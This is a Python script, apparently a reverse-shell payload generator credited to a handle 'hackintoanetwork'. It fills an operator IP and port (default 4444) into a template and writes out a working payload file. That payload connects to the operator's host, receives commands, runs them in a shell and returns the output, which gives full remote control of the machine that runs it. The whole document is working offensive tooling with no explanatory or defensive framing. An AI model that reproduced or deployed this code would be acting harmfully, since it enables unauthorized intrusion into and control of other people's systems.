import os
import socket
from requests import get
ip = get("https://api.ipify.org").text
os.system('clear')
print("""\033[1;36m  ┬ ┬┌─┐┌─┐┬┌─┬┌┐┌┌┬┐┌─┐┌─┐┌┐┌┌─┐┌┬┐┬ ┬┌─┐┬─┐┬┌─
  ├─┤├─┤│  ├┴┐││││ │ │ │├─┤│││├┤  │ ││││ │├┬┘├┴┐
  ┴ ┴┴ ┴└─┘┴ ┴┴┘└┘ ┴ └─┘┴ ┴┘└┘└─┘ ┴ └┴┘└─┘┴└─┴ ┴\033[1;m
  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐
  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘
  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─""")
print('')
print("""  [ Coded by @hackintoanetwork \033[1;36m|\033[1;m Website : hackintoanetwork.com ]""")
print('')
print("  Host Name : \033[1;36m",socket.gethostname())
print("  \033[1;mPublic IP : \033[1;36m", ip)
print('')
IP=input("  \033[1;mIP : \033[1;36m")
if IP == '' :
	print ("  Default -> \033[1;36m", ip)
	IP = ip
PORT=input("  \033[1;mPORT : \033[1;36m")
if PORT == '' :
	print ("  Default -> 4444")
	PORT = ("4444")
PAYLOAD=("""import socket
import subprocess
import os

def set_sock(ip, port):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((ip, port))
    return s

def connect_cnc(s):
    while True:
        cwd=os.getcwd()
        command=s.recv(65535).decode().lower()
        if command=="exit":
            s.close()
            break
        elif command=="pwd":
            s.send(cwd.encode("utf-8"))
            continue

        try:
            if command.startswith("cd"):
                os.chdir(command[3:].replace("\\n",""))
                command=""
                cwd=os.getcwd()
                s.send(cwd.encode("euc-kr"))
                continue
        except Exception as e:
            s.send(str(e).encode("euc-kr", "ignore"))

        proc=subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )
        output=proc.stdout.read()+proc.stderr.read()
        s.send(output)

if __name__=="__main__":
    ip="[IP]"
    port=[PORT]
    s=set_sock(ip, port)
    connect_cnc(s)""")
payload = PAYLOAD.replace("[IP]",IP).replace("[PORT]",PORT)
file = open('./Output/Payload.py', 'w')
file.write(payload)